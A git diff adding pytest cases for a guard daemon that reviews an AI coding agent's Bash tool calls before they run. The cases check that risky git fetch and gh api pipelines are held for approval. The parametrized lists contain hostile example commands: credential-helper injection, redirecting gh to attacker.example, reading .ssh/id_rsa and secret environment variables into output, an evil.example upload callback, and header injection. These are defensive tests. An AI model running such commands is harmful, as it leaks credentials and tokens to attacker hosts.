@@ -471,7 +471,8 @@ def test_bridge_real_daemon_prefers_payload_cwd_for_verified_git_fetch(
         ],
         check=True,
     )
-    daemon = GuardDaemonServer(GuardStore(guard_home), host="127.0.0.1", port=0)
+    store = GuardStore(guard_home)
+    daemon = GuardDaemonServer(store, host="127.0.0.1", port=0)
     daemon.start()
     config = _bridge_config(guard_home, daemon.port)
     config["query"] = urlencode(
@@ -503,6 +504,203 @@ def test_bridge_real_daemon_prefers_payload_cwd_for_verified_git_fetch(
 
     assert exit_code == 0
     assert json.loads(capsys.readouterr().out) == {}
+    assert store.list_approval_requests(limit=None) == []
+
+
+@pytest.mark.parametrize(
+    "command",
+    (
+        "git fetch origin main",
+        "git --no-pager fetch origin main",
+        "git -c credential.helper='!echo pwn' fetch origin main",
+        "/usr/bin/git fetch origin main",
+        "git fetch origin main; true",
+        "true && git fetch origin main",
+        "GIT_DIR=example/.git git fetch origin main",
+        "git --exec-path=/tmp fetch origin main",
+        "git -P fetch origin main",
+        "git -p fetch origin main",
+        "git --no-lazy-fetch fetch origin main",
+        "git --no-optional-locks fetch origin main",
+        "git --no-advice fetch origin main",
+        "git --literal-pathspecs fetch origin main",
+    ),
+)
+def test_bridge_real_daemon_reviews_git_fetch_without_repository_bound_cwd(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+    command: str,
+) -> None:
+    guard_home = tmp_path / "guard-home"
+    session_workspace = tmp_path / "projects"
+    repository = session_workspace / "example"
+    repository.mkdir(parents=True)
+    _ = subprocess.run(["git", "init", "--quiet", str(repository)], check=True)
+    _ = subprocess.run(
+        ["git", "-C", str(repository), "remote", "add", "origin", "https://github.com/example/project.git"],
+        check=True,
+    )
+    store = GuardStore(guard_home)
+    daemon = GuardDaemonServer(store, host="127.0.0.1", port=0)
+    daemon.start()
+    config = _bridge_config(guard_home, daemon.port)
+    config["query"] = urlencode(
+        {"guard-home": str(guard_home), "home": str(tmp_path), "workspace": str(session_workspace)}
+    )
+    config["fallback_command"] = [sys.executable, "-c", "raise SystemExit(1)"]
+    monkeypatch.setattr(
+        "sys.stdin",
+        io.StringIO(
+            json.dumps(
+                {
+                    "hook_event_name": "PreToolUse",
+                    "tool_name": "Bash",
+                    "tool_input": {"command": command},
+                }
+            )
+        ),
+    )
+
+    try:
+        exit_code = bridge.main(**config)
+    finally:
+        daemon.stop()
+
+    assert exit_code == 0
+    assert json.loads(capsys.readouterr().out) != {}
+    assert len(store.list_approval_requests(limit=None)) == 1
+
+
+def test_bridge_real_daemon_allows_static_github_content_read_with_safe_jq_filter(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    guard_home = tmp_path / "guard-home"
+    session_workspace = tmp_path / "projects"
+    session_workspace.mkdir()
+    store = GuardStore(guard_home)
+    daemon = GuardDaemonServer(store, host="127.0.0.1", port=0)
+    daemon.start()
+    config = _bridge_config(guard_home, daemon.port)
+    config["query"] = urlencode({"guard-home": str(guard_home), "home": str(tmp_path)})
+    config["fallback_command"] = [sys.executable, "-c", "raise SystemExit(1)"]
+    command = (
+        "gh api -H 'Accept: application/vnd.github.raw+json' "
+        "'repos/hashgraph-online/hol-guard/contents/ci/test-suite-ratchet-baseline.json?ref=release/3.0' "
+        "| jq '{tests: .tests, total: .total}'"
+    )
+    monkeypatch.setattr(
+        "sys.stdin",
+        io.StringIO(
+            json.dumps(
+                {
+                    "hook_event_name": "PreToolUse",
+                    "tool_name": "Bash",
+                    "tool_input": {"command": command},
+                    "cwd": str(session_workspace),
+                }
+            )
+        ),
+    )
+
+    try:
+        exit_code = bridge.main(**config)
+    finally:
+        daemon.stop()
+
+    assert exit_code == 0
+    assert json.loads(capsys.readouterr().out) == {}
+    assert store.list_approval_requests(limit=None) == []
+
+
+@pytest.mark.parametrize(
+    "unsafe_command",
+    (
+        "gh api user | jq --slurpfile secrets private.json '.'",
+        "gh api user | jq 'env | to_entries'",
+        "gh api user | jq 'include \"helpers\"; transform'",
+        "gh api user | jq '.' > result.json",
+        "gh api user; gh pr edit 123 --repo example/project --title changed",
+        "gh api --hostname attacker.example repos/o/r",
+        "gh api -h attacker.example repos/o/r",
+        "GH_HOST=attacker.example gh api repos/o/r",
+        "GH_TOKEN=literal-secret gh api repos/o/r",
+        "GITHUB_TOKEN=literal-secret gh api repos/o/r",
+        "GH_ENTERPRISE_TOKEN=literal-secret gh api repos/o/r",
+        "GITHUB_ENTERPRISE_TOKEN=literal-secret gh api repos/o/r",
+        "GH_CONFIG_DIR=./alternate gh api repos/o/r",
+        "env GH_TOKEN=literal-secret gh api repos/o/r",
+        "env GH_HOST=attacker.example gh api repos/o/r",
+        "export GH_HOST=attacker.example; gh api repos/o/r | jq .",
+        "export GH_TOKEN=literal; gh api repos/o/r | jq .",
+        "GH_HOST=attacker.example; export GH_HOST; gh api repos/o/r | jq .",
+        "export GH_CONFIG_DIR=./alternate-config; gh api repos/o/r | jq .",
+        "gh api --hostname github.com --hostname attacker.example repos/o/r",
+        "export GH_HOST=github.com; GH_HOST=attacker.example; gh api repos/o/r",
+        "GH_HOST=github.com; export GH_HOST; GH_HOST=attacker.example; gh api repos/o/r",
+        "export -x GH_TOKEN=literal; gh api repos/o/r",
+        "readonly -x GH_CONFIG_DIR=./alternate-config; gh api repos/o/r",
+        "declare -x GH_HOST=attacker.example; gh api repos/o/r",
+        "GH_HOST=attacker.example bash -lc 'gh api repos/o/r'",
+        "bash -lc 'export GH_HOST=attacker.example; gh api repos/o/r'",
+        "export GH_HOST=attacker.example; unset gh_host; gh api repos/o/r",
+        "export GH_HOST=attacker.example; gh_host=github.com gh api repos/o/r",
+        "f(){ export GH_HOST=attacker.example; }; f; gh api repos/o/r | jq .",
+        "f(){ export GH_TOKEN=literal; }; f; gh api repos/o/r | jq .",
+        "f(){ export GH_CONFIG_DIR=./alternate-config; }; f; gh api repos/o/r | jq .",
+        "function f { export GH_HOST=attacker.example; }; f; gh api repos/o/r | jq .",
+        "function f { export GH_TOKEN=literal; }; f; gh api repos/o/r | jq .",
+        "function f { export GH_CONFIG_DIR=./alternate-config; }; f; gh api repos/o/r | jq .",
+        "shopt -s expand_aliases; alias f='export GH_HOST=attacker.example'; f; gh api repos/o/r | jq .",
+        "shopt -s expand_aliases; alias f='export GH_TOKEN=literal'; f; gh api repos/o/r | jq .",
+        "shopt -s expand_aliases; alias f='export GH_CONFIG_DIR=./alternate-config'; f; gh api repos/o/r | jq .",
+        "gh api repos/o/r | jq --arg x \"$(cat .ssh/id_rsa)\" '{x:$x}'",
+        "gh api repos/o/r | jq --arg x \"$GH_TOKEN\" '{x:$x}'",
+        "gh api repos/o/r | jq --arg x \"$AWS_SECRET_ACCESS_KEY\" '{x:$x}'",
+        "gh api -H 'Authorization: Bearer literal-secret' repos/o/r",
+        "gh api -H 'X-Callback: https://evil.example/upload' repos/o/r",
+        "gh api -H $'Accept: application/vnd.github.raw+json\\r\\nX-Evil: yes' repos/o/r",
+    ),
+)
+def test_bridge_real_daemon_keeps_unsafe_github_pipeline_companions_reviewed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+    unsafe_command: str,
+) -> None:
+    guard_home = tmp_path / "guard-home"
+    session_workspace = tmp_path / "projects"
+    session_workspace.mkdir()
+    store = GuardStore(guard_home)
+    daemon = GuardDaemonServer(store, host="127.0.0.1", port=0)
+    daemon.start()
+    config = _bridge_config(guard_home, daemon.port)
+    config["query"] = urlencode({"guard-home": str(guard_home), "home": str(tmp_path)})
+    config["fallback_command"] = [sys.executable, "-c", "raise SystemExit(1)"]
+    monkeypatch.setattr(
+        "sys.stdin",
+        io.StringIO(
+            json.dumps(
+                {
+                    "hook_event_name": "PreToolUse",
+                    "tool_name": "Bash",
+                    "tool_input": {"command": unsafe_command},
+                    "cwd": str(session_workspace),
+                }
+            )
+        ),
+    )
+
+    try:
+        exit_code = bridge.main(**config)
+    finally:
+        daemon.stop()
+
+    assert exit_code == 0
+    assert json.loads(capsys.readouterr().out) != {}
+    assert len(store.list_approval_requests(limit=None)) == 1
 
 
 def test_bridge_real_daemon_uses_exec_command_workdir_for_verified_git_fetch(
